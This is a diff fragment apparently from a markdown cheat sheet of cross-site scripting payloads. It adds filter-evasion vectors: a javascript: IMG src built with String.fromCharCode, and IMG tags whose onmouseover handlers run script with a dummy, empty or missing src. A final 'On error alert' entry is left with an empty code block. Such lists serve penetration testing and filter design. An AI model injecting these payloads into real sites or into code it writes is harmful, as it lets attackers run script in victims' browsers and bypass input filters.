@@ -53,4 +53,23 @@ https://www.example.com/defaut.asp?profile=123&value=123&status=del
 ```html
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
 ```
-- `fromCharCode`
+- `fromCharCode` (if no quotes of any kind are allowed, use `eval()` to create any XSS vector)
+```html
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+```
+- Default `src` tag to get past filters that check SRC domain
+```html
+<IMG SRC=# onmouseover="alert('xxs')">
+```
+- Default `src` tag by leaving it empty
+```html
+<IMG SRC= onmouseover="alert('xxs')">
+```
+- Default `src` tag by leaving it out entirely
+```html
+<IMG onmouseover="alert('xxs')">
+```
+- On error alert
+```
+
+```
